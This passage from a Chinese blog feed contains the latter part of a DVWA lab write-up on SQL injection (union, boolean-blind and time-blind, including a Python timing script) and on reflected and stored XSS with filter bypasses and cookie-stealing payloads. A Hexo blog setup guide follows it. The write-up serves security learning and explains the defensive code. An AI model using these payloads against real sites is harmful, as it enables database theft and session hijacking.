</p><p>?&gt;</p><p>区别代码：</p><blockquote><p>$id = mysql_real_escape_string( $id );</p></blockquote><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入<br>依然可以通过抓包改参数，提交恶意构造的查询参数。<br>1.判断是否存在注入，注入是字符型还是数字型<br>1.id为1 or 1=1 #<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241617_591.png" alt=""><br>查询成功<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241618_406.png" alt=""><br>2.猜解SQL查询语句中的字段数</p><p>抓包更改参数id为1 order by 2 #，查询成功：<br>抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p><p>3.确定显示的字段顺序</p><p>抓包更改参数id为1 union select 1,2 #，查询成功：<br>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p><p>4.获取当前数据库</p><p>抓包更改参数id为1 union select 1,database() #，查询成功：<br>说明当前的数据库为dvwa。</p><p>5.获取数据库中的表</p><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><p>6.获取表中的字段名</p><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p><p>这是因为单引号被转义了，变成了\’。</p><p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><p>7.得到数据</p><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241642_694.png" alt=""><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>High：</p><p>&lt;?php </p><p>if( isset( $_SESSION [ ‘id’ ] ) ) {<br>    // Get input<br>    $id = $_SESSION[ ‘id’ ]; </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Get values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><blockquote><p>$query  = “SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;”; </p></blockquote><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。<br>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>Impossible：<br>Impossible级别的代码采用了PDO技术，暂时不会</p><p><a href="http://blog.chinaunix.net/uid-11582448-id-4432211.html" target="_blank" rel="external">SQLmap注入方法注入dvwa</a></p><h3 id="九：SQL-Injection-Blind"><a href="#九：SQL-Injection-Blind" class="headerlink" title="九：SQL Injection(Blind)"></a>九：SQL Injection(Blind)</h3><p>手工盲注的步骤（可与之前的手工注入作比较）：</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解当前数据库名3.猜解数据库中的表名4.猜解表中的字段名5.猜解数据</code></pre><p>Low：</p><p>&lt;?php </p><p>if( isset( $_GET[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_GET[ ‘id’ ]; </p><pre><code>// Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) {     // Feedback for end user     echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else {     // User wasn&#39;t found, so the page wasn&#39;t!     header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );     // Feedback for end user     echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><p>基于布尔的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：<br>输入1’ and 1=1 #，显示存在：<br>输入1’ and 1=2 #，显示不存在：<br>说明存在字符型的SQL盲注。<br>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><pre><code>输入1’ and length(database())=1 #，显示不存在；输入1’ and length(database())=2 #，显示不存在；输入1’ and length(database())=3 #，显示不存在；输入1’ and length(database())=4 #，显示存在：</code></pre><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。…</code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在…1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><p>说明第一个表名长度为9。</p><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。<br>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型</p><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟；</code></pre><p>说明存在字符型的基于时间的盲注。<br>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟1’ and if(length(database())=2,sleep(5),1) # 没有延迟1’ and if(length(database())=3,sleep(5),1) # 没有延迟1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟说明数据库名的第一个字符为小写字母d。…</code></pre><p>重复上述步骤，即可猜解出数据库名。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</code></pre><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</code></pre><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟…1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</code></pre><p>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</code></pre><p>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。<br>5.猜解数据</p><p>同样采用二分法。太浪费时间了。推荐写python脚本</p><pre><code># -*-coding:utf-8-*-  import requests  import timepayloads = &#39;abcdefghijklmnopqrstuvwxyz0123456789@_.{}-&#39;flag = &#39;&#39;url = &quot;http://222.18.158.243:4609/index.php&quot;print(&#39;test1&#39;)for x in range(1,7):for char in payloads:starttime = time.time()payload = {&quot;id&quot;: &quot;1 and if(substring(database(), &quot;+str(x)+&quot;, 1)=&#39;&quot;+char+&quot;&#39;,sleep(6),1)#&quot;}rev = requests.get(url, cookies=cookies, params=payload)if time.time() - starttime &gt; 6:flag += charprint(&#39;DatabaseName = &#39;+flag)</code></pre><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysql_real_escape_string( $id ); // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } //mysql_close(); } ?&gt; </code></pre><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>基于布尔的盲注：</p><pre><code>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>基于时间的盲注：</p><pre><code>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { // Get input $id = $_COOKIE[ &#39;id&#39; ]; // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); } ?&gt;</code></pre><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。<br>漏洞利用</p><p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，基于布尔的盲注：</p><pre><code>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>Impossible</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $id = $_GET[ &#39;id&#39; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 基本无法注入。</p><h3 id="十-反射型XSS"><a href="#十-反射型XSS" class="headerlink" title="十:反射型XSS"></a>十:反射型XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>推荐xss cheat sheet<br><a href="http://www.52bug.cn/?post=211" target="_blank" rel="external">xss漏洞检测指南</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241842_78.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241843_306.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241844_339.png" alt=""></p><p>Low：</p><pre><code>&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt;</code></pre><p>无验证，直接注入</p><script>alert(document.cookie)</script>爆出cookie内容![](http://oy0tigw51.bkt.clouddn.com/201710241848_956.png)Medium：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = str_replace( '<script>', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}</pre>";     }     ?>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。双写绕过输入<sc<script>ript>alert(/xss/)</script>，成功弹框：![](http://oy0tigw51.bkt.clouddn.com/201710241856_385.png)大小写混淆绕过输入<script>alert(/xss/)</script>，成功弹框High：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     ?>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。绕过思路：标签很多，换一种标签即可。这里用img<img src="1" onerror="alert(document.cookie)">![](http://oy0tigw51.bkt.clouddn.com/201710241900_85.png)Impossible：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $name = htmlspecialchars( $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     // Generate Anti-CSRF token     generateSessionToken();     ?>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。无法注入。### 十一：存储型XSSLow：    <?php     if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name= trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     // Sanitize name input     $name = mysql_real_escape_string( $name );     // Update database     $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '' );     //mysql_close();     }     ?>stripslashes(string)函数删除字符串中的反斜杠。可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<script>alert(/xss/)</script> name一栏前端有字数限制，burp抓包改为<script>alert(/name/)</script><p>Medium</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>查看源码发现Name只过滤了<scrpit>标签<br>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>burp抓包改name参数为<sc<script>ript&gt;alert(/xss/):<br>2.大小写混淆绕过<br>抓包改name参数为<script>alert(/xss/)</script>:<br>High</sc<script></b></scrpit></p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );<br>绕过思路：HTML页面修改Name的最大输入长度，注入Name，注入换一种标签，这里用img<br><img src="1" onerror="alert(document.cookie)"></p><p>Impossible</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>使用htmlspecialchars函数，解决了XSS</p></、>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA笔记&quot;&gt;&lt;a href=&quot;#DVWA笔记&quot; class=&quot;headerlink&quot; title=&quot;DVWA笔记&quot;&gt;&lt;/a&gt;DVWA笔记&lt;/h1&gt;&lt;h3 id=&quot;一：搭建平台&quot;&gt;&lt;a href=&quot;#一：搭建平台&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="Dvwa" scheme="http://0xmj.club/tags/Dvwa/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客搭建</title>
    <link href="http://0xmj.club/2017/11/22/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://0xmj.club/2017/11/22/hexo博客搭建/</id>
    <published>2017-11-22T08:57:45.000Z</published>
    <updated>2017-11-22T09:19:35.191Z</updated>
    
    <content type="html"><![CDATA[<p>#hexo博客搭建</p><p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p><p>确认安装成功</p><h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p><p>几个注意的地方：</p><blockquote><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p></blockquote><h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p><h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p><p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p><p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p><p>$ ssh -T git@github.com<br><img src="http://oy0tigw51.bkt.clouddn.com/201711210154_534.png" alt=""></p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p><h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p><h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p><p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p><pre><code>$ cd /f/Workspaces/hexo/$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p><p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p><h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p><p>首先，ssh key肯定要配置好。</p><p>其次，配置_config.yml中有关deploy的部分：</p><p>正确写法：</p><p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p><p>错误写法：</p><p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p><h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p><p>hexo clean<br>hexo generate<br>hexo deploy</p><ol><li><p>总结：本地调试</p></li><li><p>在执行下面的命令后，</p></li></ol><p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p><ol><li>可以用简化的一条命令</li></ol><p>hexo s -g</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server 